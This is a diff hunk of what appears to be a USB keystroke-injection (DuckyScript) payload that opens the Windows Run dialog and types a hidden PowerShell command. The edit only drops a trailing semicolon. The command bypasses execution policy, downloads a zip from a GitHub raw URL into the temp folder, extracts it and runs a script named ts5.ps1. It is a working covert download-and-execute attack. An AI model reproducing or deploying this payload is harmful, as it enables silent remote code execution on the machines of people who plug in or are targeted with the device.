@@ -32,7 +32,7 @@ DELAY 1000
 GUI r
 DELAY 500
 REM                            
-STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";iwr 'https://github.com/luciferseamus/DL/raw/main/t.zip' -O "$D\t.zip";Expand-Archive "$D\t.zip" -Des $D -Force;cd $D;.\'ts5.ps1';
+STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";iwr 'https://github.com/luciferseamus/DL/raw/main/t.zip' -O "$D\t.zip";Expand-Archive "$D\t.zip" -Des $D -Force;cd $D;.\'ts5.ps1'
 ENTER
 
 REM  Currently set for 5 seconds
